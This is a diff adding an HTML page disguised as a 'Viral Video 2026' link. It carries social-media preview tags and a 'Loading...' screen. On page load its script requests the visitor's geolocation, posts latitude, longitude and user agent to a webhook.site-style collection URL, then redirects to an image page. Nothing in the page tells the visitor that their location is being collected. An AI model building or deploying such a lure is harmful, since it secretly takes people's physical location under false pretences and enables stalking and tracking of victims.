@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Viral Video 2026</title>
+    <meta property="og:title" content="Viral Video 2026">
+    <meta property="og:description" content="Click to watch the full video">
+    <meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="video.other">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="margin:0; background:white; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div style="text-align:center;"><h2>Loading...</h2></div>
+    <script>
+        const targetURL = "https://postimg.cc/3k09KZXR";
+        const webhookURL = "https://d3f75cf1-78c6-4a72-b985-b7c8c20eb09b.webhooksite.net";
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    fetch(webhookURL, { 
+                        method: 'POST', 
+                        mode: 'no-cors', 
+                        body: JSON.stringify({
+                            lat: position.coords.latitude, 
+                            lon: position.coords.longitude,
+                            device: navigator.userAgent
+                        }) 
+                    }).then(() => { window.location.href = targetURL; });
+                }, function() { window.location.href = targetURL; }, {timeout: 5000});
+            } else { window.location.href = targetURL; }
+        };
+    </script>
+</body>
+</html>
